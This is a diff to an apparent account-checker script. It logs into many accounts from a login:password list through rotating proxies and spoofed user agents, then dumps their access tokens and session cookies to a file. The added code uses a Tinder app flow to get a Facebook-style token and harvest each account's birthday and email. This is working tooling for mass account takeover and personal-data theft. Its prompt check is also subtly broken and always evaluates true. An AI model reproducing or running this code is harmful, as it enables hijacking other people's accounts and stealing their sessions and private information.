@@ -2,6 +2,7 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from random_user_agent.user_agent import UserAgent
 from random_user_agent.params import HardwareType
 import time, requests, re, json
+from Tinder import Tinder
 
 
 def copyright():
@@ -172,15 +173,18 @@ def dump_cookies(sessioncookies):
 if __name__ == "__main__":
     requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
     copyright()
+    tinder=Tinder() if input("Do you want to get birthday and email, using Tinder app?(Y/N)")=="Y" or "y" else None
     pr = get_proxies()
     accounts = get_accounts()
     i = 0
     with open("parsed.txt", "w") as f:
         for acc in accounts:
+            uname=acc['login']
+            password=acc['password']
             session = requests.session()
-            print(f"Processing account {acc['login']}:{acc['password']}...")
+            print(f"Processing account {uname}:{password}...")
             set_proxy(session, pr, i)
-            loggedin = login(session, acc["login"], acc["password"])
+            loggedin = login(session, uname, password)
             if not loggedin:
                 continue
             token = get_token(session)
@@ -188,9 +192,24 @@ if __name__ == "__main__":
                 print("Found Accesss Token!")
                 acc["cookies"] = json.dumps(dump_cookies(session.cookies))
                 acc["token"] = token
-                f.write( f"{acc['login']}:{acc['password']}:{acc['token']}:{acc['cookies']}\n" )
             else:
                 print("Token not found!")
+                continue
+            if tinder!=None:
+                ttoken=tinder.get_fb_access_token(uname,password)
+                if ttoken.startswith("EAA"):
+                    print("Got Tinder app token...")
+                    info=tinder.get_acc_info(ttoken)
+                    print("Got account info!")
+                    if "email" in info:
+                        f.write( f"{acc['login']}:{acc['password']}:{info['birthday']}:{info['email']}:{acc['token']}:{acc['cookies']}\n" )
+                    else:
+                        f.write( f"{acc['login']}:{acc['password']}:{info['birthday']}:{acc['token']}:{acc['cookies']}\n" )
+                else:
+                    print("Couldn't get Tinder app token(")
+                    f.write( f"{acc['login']}:{acc['password']}:{acc['token']}:{acc['cookies']}\n" )
+            else:
+                f.write( f"{acc['login']}:{acc['password']}:{acc['token']}:{acc['cookies']}\n" )
             i += 1
 
     print("All done. Accounts with tokens and cookies written to parsed.txt file.")
